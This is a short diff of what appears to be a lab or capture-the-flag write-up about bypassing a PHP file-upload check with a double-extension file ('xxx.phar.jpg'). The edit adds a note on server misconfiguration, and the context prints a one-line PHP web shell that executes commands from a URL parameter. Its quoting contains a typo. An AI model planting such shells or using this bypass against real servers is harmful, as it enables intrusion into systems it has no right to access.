@@ -101,7 +101,7 @@
             echo "File failed to upload";
         }
         ```
-   - Base on this code a file named `xxx.phar.jpg` with the allowed MIME type will bypass the check. Create this file with:
+   - Base on this code a file named `xxx.phar.jpg` with the allowed MIME type will bypass the check (the server misconfigured configs allowed for double extension reverse exploit). Create this file with:
         ```
         $ cat test.phar
         <?php system($_GET['cmd]);?>
